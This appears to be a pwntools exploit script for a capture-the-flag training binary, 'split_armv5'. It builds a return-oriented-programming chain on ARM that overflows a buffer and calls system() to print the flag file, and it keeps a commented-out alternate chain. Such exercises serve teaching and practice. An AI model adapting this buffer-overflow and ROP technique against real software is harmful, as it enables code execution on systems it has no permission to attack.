from pwn import *

mov_and_blx = 0x10634
pop_many = 0x10644
pop_r3_pop_pc = 0x000103a4
mov_r0_r3_pop_fp_pop_pc = 0x00010558 #: mov r0, r3 ; pop {fp, pc}
system_addr = 0x000103ec
bin_cat_flag_txt = 0x2103c

p = process('./split_armv5')

p.recvuntil(b'> ')


buf = b'A' * 0x24
buf += p32(pop_r3_pop_pc)
buf += p32(bin_cat_flag_txt) # r3
buf += p32(mov_r0_r3_pop_fp_pop_pc) #pc
buf += p32(0xAA) #fp
buf += p32(system_addr)
#buf += p32(pop_many)
#buf += p32(system_addr) #r3
#buf += p32(0xAA) #r4
#buf += p32(0xAA) #r5
#buf += p32(0xAA) #r6
#buf += p32(bin_cat_flag_txt) #r7 -> r0
#buf += p32(0xAA) #r8 
#buf += p32(0xAA) #r9 
#buf += p32(mov_and_blx) #pc
#buf += p32(0x105dc)

p.send(buf)
p.interactive()

